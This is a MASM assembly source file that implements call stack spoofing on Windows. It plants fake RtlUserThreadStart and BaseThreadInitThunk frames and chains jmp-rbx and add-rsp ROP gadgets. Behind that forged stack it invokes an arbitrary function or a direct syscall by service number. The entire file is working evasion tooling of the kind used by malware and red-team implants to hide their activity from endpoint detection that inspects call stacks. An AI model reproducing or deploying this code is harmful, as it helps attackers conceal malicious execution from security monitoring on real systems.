;;
;; Code responsible for Call Stack Spoofing Via Desync (MASM)
;;

;;
;; Export
;;
Spoof proto

.data

;;
;; Configuration structure passed to the spoof ASM routine
;;
Config STRUCT
    RtlUserThreadStartAddr       DQ 1
    RtlUserThreadStartFrameSize  DQ 1
    
    BaseThreadInitThunkAddr      DQ 1
    BaseThreadInitThunkFrameSize DQ 1

    FirstFrame                   DQ 1
    SecondFrame                  DQ 1
    JmpRbxGadget                 DQ 1
    AddRspXGadget                DQ 1

    FirstFrameSize               DQ 1
    SecondFrameSize              DQ 1
    JmpRbxGadgetFrameSize        DQ 1
    AddRspXGadgetFrameSize       DQ 1

    RbpOffset                    DQ 1

    SpooFunction                 DQ 1
    ReturnAddress                DQ 1

    IsSyscall                    DD 0
    Ssn                          DD 0

    NArgs                        DQ 1
    Arg01                        DQ 1
    Arg02                        DQ 1
    Arg03                        DQ 1
    Arg04                        DQ 1
    Arg05                        DQ 1
    Arg06                        DQ 1
    Arg07                        DQ 1
    Arg08                        DQ 1
    Arg09                        DQ 1
    Arg10                        DQ 1
    Arg11                        DQ 1
Config ENDS

.code

;;
;; Function responsible for Call Stack Spoofing
;;
Spoof PROC
    ;;
    ;; Saving non-vol registers
    ;;
    push rbp
    push rbx

    ;;
    ;; Return main 
    ;;
    mov rbp, rsp 

    ;;
    ;; Creating stack pointer to Restore PROC
    ;;
    lea rax, Restore
    push rax
    lea rbx, [rsp]

    ;;
    ;; First Frame (Fake origin)
    ;;
    push [rcx].Config.FirstFrame

    mov rax, [rcx].Config.ReturnAddresS
    sub rax, [rcx].Config.FirstFrameSize

    sub rsp, [rcx].Config.SecondFrameSize
    mov r10, [rcx].Config.RbpOffset
    mov [rsp + r10], rax
    
    ;;
    ;; ROP Frames
    ;;
    push [rcx].Config.SecondFrame

    ;;
    ;; JMP [RBX] Gadget / Stack Pivot (To restore original Control Flow Stack)
    ;;
    sub rsp, [rcx].Config.JmpRbxGadgetFrameSize
    push [rcx].Config.JmpRbxGadget

    sub rsp, [rcx].Config.AddRspXGadgetFrameSize
    push [rcx].Config.AddRspXGadget

    ;;
    ;; Set the pointer to the function to call in R11
    ;;
    mov r11, [rcx].Config.SpooFunction
    jmp Parameters
Spoof ENDP

;;
;; Set the parameters to pass to the target function
;;
Parameters PROC
    mov r12, rcx 
    mov rax, [r12].Config.NArgs
    
    ; Arg01 (rcx)
    cmp rax, 1
    jb skip_1
    mov rcx, [r12].Config.Arg01

skip_1:
    ; Arg02 (rdx)
    cmp rax, 2
    jb skip_2
    mov rdx, [r12].Config.Arg02
    
skip_2:
    ; Arg03 (r8)
    cmp rax, 3
    jb skip_3
    mov r8, [r12].Config.Arg03

skip_3:
    ; Arg04 (r9)
    cmp rax, 4
    jb skip_4
    mov r9, [r12].Config.Arg04

skip_4:
    ; Stack-based args
    lea r13, [rsp] 

    cmp rax, 5
    jb skip_5
    mov r10, [r12].Config.Arg05
    mov [r13 + 28h], r10

skip_5:
    ; Arg06
    cmp rax, 6
    jb skip_6
    mov r10, [r12].Config.Arg06
    mov [r13 + 30h], r10

skip_6:
    ; Arg07
    cmp rax, 7
    jb skip_7
    mov r10, [r12].Config.Arg07
    mov [r13 + 38h], r10

skip_7:
    ; Arg08
    cmp rax, 8
    jb skip_8
    mov r10, [r12].Config.Arg08
    mov [r13 + 40h], r10
    
skip_8:
    ; Arg09
    cmp rax, 9
    jb skip_9
    mov r10, [r12].Config.Arg09
    mov [r13 + 48h], r10

skip_9:
    ; Arg10
    cmp rax, 10
    jb skip_10
    mov r10, [r12].Config.Arg10
    mov [r13 + 50h], r10

skip_10:
    ; Arg11
    cmp rax, 11
    jb skip_11
    mov r10, [r12].Config.Arg11
    mov [r13 + 58h], r10

skip_11:
    cmp [r12].Config.IsSyscall, 1
    je ExecuteSyscall

    jmp Execute
Parameters ENDP

;;
;; Restores the original stack frame
;;
Restore PROC
    mov rsp, rbp
    pop rbx
    pop rbp
    ret
Restore ENDP

;;
;; Executes the target function
;;
Execute PROC
    jmp QWORD PTR r11
Execute ENDP

;;
;; Executes a native Windows system call using the spoofed context
;;
ExecuteSyscall PROC
    mov r10, rcx
    mov eax, [r12].Config.Ssn
    jmp QWORD PTR r11
ExecuteSyscall ENDP

END